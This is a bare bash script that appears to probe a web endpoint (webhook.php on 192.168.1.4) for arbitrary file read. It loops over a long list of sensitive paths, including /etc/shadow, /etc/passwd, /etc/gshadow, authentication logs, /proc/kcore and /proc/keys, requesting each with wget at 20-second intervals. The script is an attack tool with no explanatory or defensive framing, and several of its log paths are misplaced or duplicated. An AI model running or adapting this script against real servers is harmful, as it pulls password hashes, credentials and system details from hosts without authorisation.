declare -a files=("/etc/passwd"
		"/etc/adduser.conf"
		"/etc/bash.bashrc"
		"/etc/issue"
		"/etc/ca-certificates.conf"
		"/etc/shadow"
		"/etc/services"
		"/etc/networks"
		"/etc/group"
		"/etc/gshadow"
		"/etc/hosts"
		"/etc/network/interfaces"
		"/etc/security/access.conf"
		"/etc/security/group.conf"
		"/etc/security/limits.conf"
		"/etc/security/time.conf"
		"/etc/security/capability.conf"
		"/etc/security/access.conf"

		"/var/alternatives.log"
		"/var/auth.log"
		"/var/boot.log"
		"/var/lastlog"
		"/var/kern.log"
		"/var/faillog.log"
		"/var/syslog"

		"/var/www/html/index.html"
		"/var/www/html/webhook.php"

		"/proc/cmdline"
		"/proc/execdomains"
		"/proc/filesystems"
		"/proc/crypto"
		"/proc/interrupts"
		"/proc/ioports"
		"/proc/kallsyms"
		"/proc/kcore"
		"/proc/keys"
		"/proc/key-users"
		"/proc/kmsg"
		"/proc/key-users"
		"/proc/kpagecount"
		"/proc/locks"
		"/proc/meminfo"
		"/proc/misc"
		"/proc/zoneinfo"
		"/proc/vmstat"
		"/proc/version"
		"/proc/uptime"
		"/proc/stat"
		"/proc/schedstat"
		"/proc/partitions"
		"/proc/net/arp"
		"/proc/net/connector"
		"/proc/net/dev"
		"/proc/net/dev_mcast"
		"/proc/net/fib_trie"
		"/proc/net/hci"
		"/proc/net/icmp"
		"/proc/net/icmp6"
		"/proc/net/if_inet6"
		"/proc/net/ip_tables_matches"
		"/proc/net/ip_tables_names"
		"/proc/net/ipv6_route"
		"/proc/net/l2cap"
		"/proc/net/mcfilter"
		"/proc/net/mcfilter6"
		"/proc/net/netlink"
		"/proc/net/netstat"
		"/proc/net/packet"
		"/proc/net/pnp"
		"/proc/net/protocols"
		"/proc/net/psched"
		"/proc/net/ptype"
		"/proc/net/raw"
		"/proc/net/raw6"
		"/proc/net/route"
		"/proc/net/rt6_acct"
		"/proc/net/sco"
		"/proc/net/snmp"
		"/proc/net/snmp6"
		"/proc/net/sockstat"
		"/proc/net/sockstat6"
		"/proc/net/softnet_stat"
		"/proc/net/tcp"
		"/proc/net/tcp6"
		"/proc/net/udp"
		"/proc/net/udp6"
		"/proc/net/udplite"
		"/proc/net/unix"
		"/proc/net/wireless"
		)


for file in "${files[@]}"
do
	wget http://192.168.1.4/webhook.php/file="$file"
	sleep 20
done